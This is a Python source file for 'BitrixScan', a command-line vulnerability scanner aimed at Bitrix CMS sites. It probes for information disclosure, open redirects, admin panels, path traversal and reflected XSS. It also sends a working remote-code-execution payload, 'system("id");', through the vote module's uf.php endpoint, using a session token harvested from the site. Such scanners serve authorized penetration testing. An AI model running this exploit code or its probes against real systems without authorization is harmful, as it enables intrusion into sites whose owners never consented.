#!/usr/bin/env python3

import requests
import argparse
import json
import sys

from pyfiglet import Figlet
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Style
from config import Config

init(autoreset=True)
requests.packages.urllib3.disable_warnings()


class Scanner:
    def __init__(self, url, config):
        self.url = url if url.endswith('/') else url + '/'
        self.config = config
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': config.USER_AGENT})
        self.session.verify = False

        self.bitrix_sessid = None
        self.composite_data = None

        self.findings = defaultdict(list)

    
    def log(self, severity, title, url, desc=""):
        self.findings[(severity, title)].append({
            'url': url,
            'description': desc
        })

    
    def check(self, path, method='GET', **kwargs):
        try:
            url = self.url + path.lstrip('/')
            if method == 'GET':
                return self.session.get(url, timeout=self.config.TIMEOUT, **kwargs)
            elif method == 'POST':
                return self.session.post(url, timeout=self.config.TIMEOUT, **kwargs)
        except requests.RequestException:
            return None

    
    def get_composite_data(self):
        resp = self.check('/bitrix/tools/composite_data.php')
        if resp and resp.status_code == 200 and resp.text != "[]":
            try:
                data = json.loads(resp.text.replace("'", '"'))
                self.composite_data = data
                self.bitrix_sessid = data.get('bitrix_sessid')
            except Exception:
                pass

    
    def detect_version(self):
        for year, path in self.config.BITRIX_VERSIONS:
            resp = self.check(path)
            if resp and resp.status_code == 200:
                self.log('INFO', f'Bitrix {year} detected', self.url + path)
                return year
        return None

    
    def scan_info_disclosure(self):
        def check_url(path):
            resp = self.check(path)
            if not resp:
                return

            if 'license_key.php' in path and resp.status_code == 200 and resp.text.strip():
                self.log('MEDIUM', 'License Key Disclosure', self.url + path)

            elif 'composite_data.php' in path and resp.status_code == 200:
                self.log('INFO', 'Composite Data Available', self.url + path)

            elif resp.status_code >= 500:
                self.log('LOW', 'Path Disclosure', self.url + path)

        with ThreadPoolExecutor(max_workers=self.config.THREADS) as ex:
            ex.map(check_url, self.config.INFO_DISCLOSURE)

    
    def scan_open_redirect(self):
        def check_url(path):
            resp = self.check(path, allow_redirects=False)
            if resp and resp.status_code in [301, 302]:
                location = resp.headers.get('Location', '')
                if 'google.com' in location:
                    self.log('MEDIUM', 'Open Redirect', self.url + path, location)

        with ThreadPoolExecutor(max_workers=self.config.THREADS) as ex:
            ex.map(check_url, self.config.OPEN_REDIRECT)

    
    def scan_admin_panels(self):
        def check_url(path):
            resp = self.check(path)
            if resp and resp.status_code == 200 and 'Авторизация' in resp.text:
                self.log('INFO', 'Admin Panel Found', self.url + path)

        with ThreadPoolExecutor(max_workers=self.config.THREADS) as ex:
            ex.map(check_url, self.config.ADMIN_PANELS)

    
    def scan_registration(self):
        def check_url(path):
            resp = self.check(path)
            if resp and resp.status_code == 200 and 'Регистрация' in resp.text:
                self.log('INFO', 'Registration Available', self.url + path)

        with ThreadPoolExecutor(max_workers=self.config.THREADS) as ex:
            ex.map(check_url, self.config.REGISTRATION)

    
    def scan_path_traversal(self):
        for path in self.config.PATH_TRAVERSAL:
            resp = self.check(path)
            if resp and resp.status_code == 200 and resp.text.strip():
                self.log('CRITICAL', 'Path Traversal / LFI', self.url + path)

    
    def scan_content_spoofing(self):
        for path in self.config.CONTENT_SPOOFING:
            resp = self.check(path)
            if resp and resp.status_code == 200:
                if 'evil.host' in resp.text:
                    self.log('MEDIUM', 'Content Spoofing', self.url + path)

    
    def scan_xss(self):
        for path in self.config.XSS_URLS:
            resp = self.check(path)
            if resp and resp.status_code == 200 and 'alert' in resp.text.lower():
                self.log('HIGH', 'Reflected XSS', self.url + path)

    
    def check_rce_vote(self):
        if not self.bitrix_sessid:
            return

        files = {
            'bxu_files[x][NAME]': (None, 'system("id");'),
            'sessid': (None, self.bitrix_sessid),
        }

        params = {
            'attachId[MODULE_ID]': 'vote',
            'action': 'vote'
        }

        resp = self.check('/bitrix/tools/vote/uf.php', method='POST', params=params, files=files)
        if resp and resp.status_code == 200 and resp.text.strip():
            self.log('CRITICAL', 'RCE via Vote (Object Injection)',
                     self.url + 'bitrix/tools/vote/uf.php')

    
    def render_results(self):
        colors = {
            'CRITICAL': Fore.RED,
            'HIGH': Fore.MAGENTA,
            'MEDIUM': Fore.YELLOW,
            'LOW': Fore.BLUE,
            'INFO': Fore.CYAN
        }

        order = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']

        print(f"\n{Fore.CYAN}{'─'*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Scan results{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'─'*60}{Style.RESET_ALL}\n")

        for severity in order:
            items = [(k, v) for k, v in self.findings.items() if k[0] == severity]
            if not items:
                continue

            color = colors.get(severity, Fore.WHITE)
            print(f"{color}{severity} ({len(items)}){Style.RESET_ALL}")

            for (sev, title), entries in items:
                print(f"  └─ {title} ({len(entries)} endpoint{'s' if len(entries) > 1 else ''})")
                for e in entries:
                    print(f"     - {Fore.WHITE}{e['url']}{Style.RESET_ALL}")

                    if self.config.VERBOSE and e.get('description'):
                        print(f"       {Style.DIM}{e['description']}{Style.RESET_ALL}")

            print()

    
    def run(self, level='normal'):
        print(f"{Fore.CYAN}[→] Target: {Fore.WHITE}{self.url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[→] Level: {Fore.WHITE}{level}{Style.RESET_ALL}\n")

        self.get_composite_data()

        print(f"{Fore.YELLOW}[*] Detecting Bitrix...{Style.RESET_ALL}")
        self.detect_version()

        print(f"{Fore.YELLOW}[*] Scanning vulnerabilities...{Style.RESET_ALL}\n")
        self.scan_info_disclosure()
        self.scan_open_redirect()
        self.scan_admin_panels()
        self.scan_registration()
        self.scan_path_traversal()
        self.scan_content_spoofing()
        self.scan_xss()

        if level in ['normal', 'full']:
            print(f"\n{Fore.YELLOW}[*] Checking RCE vulnerabilities...{Style.RESET_ALL}\n")
            self.check_rce_vote()

        self.render_results()
        return self.findings


def main():
    parser = argparse.ArgumentParser(description='BitrixScan - Fast Bitrix vulnerability scanner')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-l', '--level', choices=['quick', 'normal', 'full'], default='normal')
    parser.add_argument('-t', '--threads', type=int, default=5)
    parser.add_argument('-v', '--verbose', action='store_true')
    parser.add_argument('-o', '--output')

    args = parser.parse_args()

    f = Figlet(font='slant')
    print(Fore.CYAN + f.renderText('BitrixScan'))
    print(Fore.YELLOW + "      [ Fast Bitrix Vulnerability Scanner ]\n")
    print(f"{Fore.WHITE}{Style.DIM}        Created by @s0ld13rr | v1.0.0\n")

    config = Config()
    config.THREADS = args.threads
    config.VERBOSE = args.verbose

    scanner = Scanner(args.url, config)

    try:
        results = scanner.run(args.level)

        if args.output:
            with open(args.output, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted{Style.RESET_ALL}")
        sys.exit(1)


if __name__ == '__main__':
    main()
